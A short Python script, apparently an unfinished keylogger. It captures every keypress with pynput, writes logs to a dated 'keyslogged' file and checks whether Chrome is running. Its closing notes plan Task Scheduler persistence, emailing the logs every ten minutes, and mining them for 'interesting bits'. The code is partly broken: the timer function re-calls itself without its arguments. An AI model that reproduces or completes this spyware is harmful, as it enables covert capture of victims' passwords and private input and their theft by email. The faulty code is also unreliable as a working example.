from pynput.keyboard import Key, Listener
import psutil
import os
import datetime
import threading

PATH = os.path.dirname(os.path.abspath(__file__))
date = datetime.date.today()

def on_press(key):
    print('{0} pressed'.format(key))

def isRunning(processName):
    for pid in psutil.pids():
        p = psutil.Process(pid)
        if p.name() == processName:
            return True
    return False

def writeSchedule(log, interval):
    threading.Timer(float(interval), writeSchedule).start()
    saveLog(log)
    return ''

def saveLog(log):
    with open('{}\\{}_keyslogged.txt'.format(PATH, date), 'a') as f:
        f.write(log +'\n')

with Listener(on_press=on_press) as listener:
    listener.join()

print(isRunning('chrome.exe'))




"""
create buffer and save after every t seconds
create a task in task scheduler.
send to email aevery 10 min
sister script that downloads emails
anyalize logs to find interesting bits
"""

